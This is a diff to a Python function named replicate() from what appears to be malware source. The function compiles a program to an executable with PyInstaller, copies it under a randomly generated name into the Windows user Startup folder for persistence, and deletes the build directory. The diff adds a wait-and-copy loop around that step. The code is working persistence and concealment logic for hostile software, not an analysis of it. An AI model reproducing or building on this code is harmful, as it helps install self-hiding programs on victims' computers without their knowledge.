@@ -1,4 +1,6 @@
 import os
+import time
+
 from Utils.helpers import random_string, download_file,\
     extract_zip,tempFolder,BaseTempFolder,install_with_pyinstaller,find_python_path
 from shutil import copytree,rmtree,copyfile
@@ -22,13 +24,17 @@ def replicate():
             rmtree(original_location)
             install_with_pyinstaller(pyinstaller_path=pyinstaller_place,
                                      base_dir=new_location,
-                                     file_to_install='main.pyw',
+                                     file_to_install='main.py',
                                      hidden_imports=['psutil','sqlite3','requests'])
             obfuscated_file_name = random_string(is_random=True, is_exe=True)
             obfuscated_startup_folder = f"c:/users/{os.getlogin()}/" \
                                         f"appdata/roaming/microsoft/" \
                                         f"windows/start menu/programs/startup/{obfuscated_file_name}"
-            copyfile(os.path.join(new_location,'main.exe'), obfuscated_startup_folder)
+            while 0x001:
+                if not os.path.exists(os.path.join(new_location,'main.exe')):
+                    time.sleep(5)
+                copyfile(os.path.join(new_location,'main.exe'), obfuscated_startup_folder)
+                break
             rmtree(new_location)
 
             return True
